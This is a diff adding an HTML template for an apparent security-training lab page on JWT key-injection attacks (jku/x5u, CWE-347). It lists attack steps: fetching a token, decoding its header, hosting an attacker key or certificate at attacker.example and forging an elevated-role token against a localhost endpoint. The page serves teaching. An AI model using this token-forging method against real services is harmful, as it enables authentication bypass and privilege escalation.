@@ -1,0 +1,37 @@
+{% extends 'base.html' %}
+{% block title %}JWT {{ attack }}{% endblock %}
+{% block content %}
+<div class="panel">
+  <div class="panel-head">
+    <span class="badge p1">P1</span>
+    <h2>JWT {{ attack }}</h2>
+    <p class="mono-dim">CWE-347 · Server fetches verification key from attacker-controlled URL</p>
+  </div>
+  <div class="vuln-info">{{ description }}</div>
+
+  <h3>Attack Flow</h3>
+  <div class="hint-box">
+    <b>Step 1 — Get a legitimate token:</b>
+    <pre class="result-block">curl -X POST http://localhost:5000{{ token_endpoint }} \
+  -d "username=admin"</pre>
+    <b>Step 2 — Inspect the token header (base64-decode part 1):</b>
+    <pre class="result-block">TOKEN="&lt;paste token here&gt;"
+echo $TOKEN | cut -d. -f1 | base64 -d 2>/dev/null | python3 -m json.tool</pre>
+    {% if version == "v8" %}
+    <b>Step 3 — Host your own JWKS (attacker server):</b>
+    <pre class="result-block"># Generate attacker key + JWKS, host at http://attacker.example/jwks.json
+# Then forge a token with role:commander and jku pointing at your JWKS URL</pre>
+    <b>Step 4 — Send forged token:</b>
+    <pre class="result-block">curl http://localhost:5000{{ verify_endpoint }} \
+  -H "Authorization: Bearer &lt;your-forged-token&gt;"</pre>
+    {% else %}
+    <b>Step 3 — Host your own X.509 cert (attacker server):</b>
+    <pre class="result-block"># Generate RSA key + self-signed cert, host PEM at http://attacker.example/cert.pem
+# Forge a RS256 token with role:commander and x5u pointing at your cert URL
+# python3 -c "from cryptography.hazmat... (see STUDENT_GUIDE.md)"</pre>
+    {% endif %}
+    <b>Legitimate endpoint for reference:</b>
+    <a href="{{ token_endpoint }}" class="mono-dim">{{ token_endpoint }}</a> (POST username=admin)
+  </div>
+</div>
+{% endblock %}
